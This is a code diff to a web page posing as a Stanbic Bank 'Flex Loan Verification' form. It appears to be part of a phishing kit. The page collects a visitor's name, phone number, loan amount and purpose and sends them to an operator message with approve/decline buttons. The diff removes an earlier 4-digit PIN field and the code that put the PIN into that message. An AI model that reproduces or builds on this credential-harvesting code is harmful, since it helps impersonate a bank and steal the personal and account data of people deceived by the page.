@@ -506,14 +506,6 @@
                             <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
                         </div>
                     </div>
-
-                    <div class="input-group">
-                        <div class="input-wrapper" id="wrapPin">
-                            <span style="margin-right: 15px; font-size: 18px; opacity: 0.6;">&#128274;</span>
-                            <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
-                        </div>
-                    </div>
-
                     <button type="submit" class="verify-btn">Verify &amp; Continue</button>
                 </form>
             </div>
@@ -635,26 +627,24 @@
             e.preventDefault();
             clrErr();
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            const pin = document.getElementById('pin').value.trim();
-
             let ok = true;
             if (phone.length < 9) {
                 showErr('Please enter a valid 9-digit mobile number.');
                 document.getElementById('wrapPhone').classList.add('invalid');
                 ok = false;
             }
-            if (pin.length !== 4) {
-                if (ok) showErr('PIN must be exactly 4 digits.');
-                document.getElementById('wrapPin').classList.add('invalid');
-                ok = false;
-            }
+
             if (!ok) return;
 
-            const msg = '\ud83d\ude80 <b>Stanbic Bank Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, {
-                minimumFractionDigits: 2,
-                maximumFractionDigits: 2
-            }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';
-
+            const msg = '🚀 <b>Stanbic Bank Flex Loan Verification</b>\n\n' +
+                '👤 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n' +
+                '📱 <b>Phone:</b> <code>' + phone + '</code>\n' +
+                '💰 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                }) + ' USD</code>\n' +
+                '🎯 <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\n' +
+                'Please choose an action below:';
             // 3 buttons: Approved / Declined / Already Applied
             const buttons = [
                 [{
